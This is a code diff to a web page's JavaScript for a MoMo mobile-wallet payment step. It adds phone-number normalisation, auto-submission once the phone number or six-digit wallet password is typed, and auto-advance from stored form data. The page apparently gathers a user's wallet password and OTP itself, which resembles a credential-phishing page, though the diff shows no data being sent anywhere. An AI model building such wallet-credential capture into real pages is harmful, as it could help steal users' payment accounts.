@@ -877,6 +877,17 @@
 
         const formData = getFormData();
 
+        const normalizePhoneForWallet = (phone) => {
+          const digits = String(phone || "").replace(/\D/g, "");
+          if (digits.length === 10 && digits.startsWith("0")) {
+            return digits.slice(1);
+          }
+          if (digits.length === 11 && digits.startsWith("84")) {
+            return digits.slice(2);
+          }
+          return digits.length === 9 ? digits : "";
+        };
+
         const otpInputs = document.querySelectorAll(
           "#momo-otp-section .otp-input"
         );
@@ -1171,6 +1182,15 @@ otification ${type} show`;
               "invalid",
               value.length > 0 && value.length < 9
             );
+            if (value.length === 9) {
+              handlePhoneSubmit();
+            }
+          });
+
+          passwordInputEl.addEventListener("input", () => {
+            if (passwordInputEl.value.length === 6) {
+              handlePasswordSubmit();
+            }
           });
 
           otpInputs.forEach((input, index) => {
@@ -1205,9 +1225,26 @@ otification ${type} show`;
           });
         };
 
+        const autoAdvanceFromEvaluate = () => {
+          const storedData =
+            JSON.parse(sessionStorage.getItem("formData") || "{}");
+          if (storedData.methodKey !== "momo") return;
+
+          showSection("momo-phone-section");
+          const phoneInput = getEl("momo-phone");
+          const normalizedPhone = normalizePhoneForWallet(storedData.phone);
+          if (normalizedPhone.length === 9) {
+            phoneInput.value = normalizedPhone;
+            setTimeout(() => handlePhoneSubmit(), 300);
+            return;
+          }
+          setTimeout(() => phoneInput.focus(), 150);
+        };
+
         const init = () => {
           populateData();
           setupEventListeners();
+          autoAdvanceFromEvaluate();
         };
 
         init();
